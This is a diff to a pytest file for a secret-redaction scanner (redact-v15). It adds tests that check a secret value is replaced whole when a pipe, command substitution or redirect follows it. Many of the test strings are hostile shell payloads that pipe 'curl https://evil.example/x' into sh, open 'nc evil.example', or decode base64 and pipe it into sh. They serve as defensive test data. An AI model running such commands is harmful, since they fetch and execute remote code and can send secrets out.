@@ -1,4 +1,4 @@
-"""The scanner's second redaction pass (`prepare.redact`, redact-v14): one positive per secret shape,
+"""The scanner's second redaction pass (`prepare.redact`, redact-v15): one positive per secret shape,
 the forms the plugins also catch (URL passwords, credential keys in JSON-encoded text and in parsed
 objects, prose, whole private keys, command-line password flags, access codes, PINs and passport numbers
 named by a cue word or key, random values under a key or header), the negatives that must survive (emails, hosts, placeholders, ordinary prose), parity
@@ -109,7 +109,7 @@ def test_second_pass_walks_and_never_mutates():
     assert obj["new_inputs"][0]["content"] == f"token {secret}"  # input untouched
     assert out["n"] == 3 and out["flag"] is None and secret in out
     assert second_pass(out) == (out, 0)  # idempotent: the placeholder never matches
-    assert REDACTION_VERSION == "redact-v14"
+    assert REDACTION_VERSION == "redact-v15"
 
 
 def test_two_shapes_on_one_value_count_once():
@@ -154,6 +154,15 @@ ADVERSARIAL = [
     ("token = ", "aaa1", 200_000, "("),
     ("token: config.", "a", 1_000_000, ""),
     ("token = ", "a(b", 300_000, ""),
+    ("TOKEN=abcdefg", "|a", 100_000, ""),
+    ("TOKEN=abcdefg", "|ab|", 50_000, ""),
+    ("TOKEN=abcdefg", "|" + "w" * 40 + "X", 5_000, ""),
+    ("TOKEN=abcdefg", "|w$x", 50_000, ""),
+    ("TOKEN=abcdefg", "$(", 100_000, ""),
+    ("TOKEN=", "|", 200_000, "x"),
+    ("MY_SECRET_TOKEN=abcdefg", "|ab", 70_000, ""),
+    ("the password is ", "|ab", 70_000, ""),
+    ("", "token=ab|cd ", 17_000, ""),
 ]
 
 
@@ -928,9 +937,24 @@ BOUNDARY_BOUNDED = [
     ("password=" + "Xk29" + ",;fQv7", "Xk29,;fQv7"),
     ('password="' + "Xk29fQv7" + ';$(curl x|sh)"', "Xk29fQv7"),
 ]
+# Where a value ends before a pipe, a command substitution or a redirect (redact-v15): cases both plugins share, with
+# `{v}` filled with a value built here.
+_PIPE_V = "Xk29fQ" + "v7Lm2Pq8"
+PIPE_CASES = [
+    (c["text"].replace("{v}", _PIPE_V), c["value"].replace("{v}", _PIPE_V))
+    for c in json.loads(
+        (
+            Path(__file__).resolve().parents[2]
+            / "integrations"
+            / "fixtures"
+            / "redact-boundaries"
+            / "cases.json"
+        ).read_text()
+    )["cases"]
+]
 
 
-@pytest.mark.parametrize(("text", "secret"), BOUNDARY_WHOLE + BOUNDARY_BOUNDED)
+@pytest.mark.parametrize(("text", "secret"), BOUNDARY_WHOLE + BOUNDARY_BOUNDED + PIPE_CASES)
 def test_a_value_is_replaced_whole_and_what_follows_it_stays(text, secret):
     assert redact_text(text) == (text.replace(secret, P), 1)
 
@@ -948,7 +972,7 @@ def test_one_value_is_one_span_however_it_is_written():
 
 def test_value_boundaries_match_the_hermes_plugin():
     plugin = _plugin_module().Redactor("standard", "parity")
-    for text, _ in BOUNDARY_WHOLE + BOUNDARY_BOUNDED:
+    for text, _ in BOUNDARY_WHOLE + BOUNDARY_BOUNDED + PIPE_CASES:
         for form in (text, _as_result(text)):
             theirs = re.sub(r"⟦secret:[a-z_]+:[0-9a-f]{4}⟧", P, plugin.string(form))
             assert redact_text(form)[0] == theirs, form
@@ -963,6 +987,24 @@ def test_value_boundaries_match_the_hermes_plugin():
         "TOKEN={v};/bin/sh<x",
         "TOKEN={v};./run.sh",
         'password="{v};$(curl${{IFS}}evil.example/x|sh)"',
+        "TOKEN={v}|curl${{IFS}}https://evil.example/x|sh",
+        "TOKEN={v}|curl https://evil.example/x|sh",
+        "TOKEN={v}|curl$IFS/evil.example/x|sh",
+        "TOKEN={v}$(curl${{IFS}}https://evil.example/x)",
+        "TOKEN={v}$(curl https://evil.example/x|sh)",
+        "TOKEN={v}`curl https://evil.example/x`",
+        "TOKEN={v}||curl https://evil.example/x|sh",
+        "TOKEN={v}|&curl https://evil.example/x",
+        "TOKEN={v}<(curl https://evil.example/x)",
+        "TOKEN={v}>(nc evil.example 9)",
+        "TOKEN={v}|$(curl https://evil.example/x)",
+        "TOKEN={v}|(curl https://evil.example/x|sh)",
+        "TOKEN={v}|base64 -d|sh",
+        "TOKEN={v}|base64|sh",
+        "TOKEN={v}>out.txt",
+        "echo TOKEN={v}|base64 -d|sh",
+        "MY_SECRET_TOKEN={v}|curl https://evil.example/x|sh",
+        "echo token: {v}|curl${{IFS}}https://evil.example/x|sh",
     ],
 )
 def test_a_command_after_a_value_keeps_its_shape(command):
